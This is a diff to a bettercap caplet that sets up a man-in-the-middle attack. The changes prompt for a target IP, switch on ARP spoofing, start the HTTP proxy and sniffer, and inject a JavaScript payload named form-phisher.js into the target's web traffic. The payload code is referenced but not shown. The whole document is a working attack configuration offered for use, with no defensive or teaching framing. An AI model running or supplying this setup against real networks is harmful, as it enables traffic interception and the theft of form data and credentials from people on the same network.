@@ -1,8 +1,16 @@
-# Set the path to your JavaScript payload
-set jsinject.payload jsinject/payloads/form-phisher.js
+# USAGE: bettercap -caplet jsinject.cap    (make sure you are in the current dir, or enter full path)
 
-set http.proxy.script jsinject/jsinject.js
+# Hardcode a target.  Uncomment only if you comment out the dynamic setting, below
+#set arp.spoof.targets 192.168.0.172
+
+# Dynamically ask user for a target.  Comment out if you uncomment out the hardcoded setting, above.
+read arp.spoof.targets Select the target to spoof:
+
+# Set the path to your JavaScript payload
+set jsinject.payload payloads/form-phisher.js
+
+set http.proxy.script jsinject.js
 set net.sniff.verbose false
 net.sniff on
 http.proxy on
-#arp.spoof on
+arp.spoof on
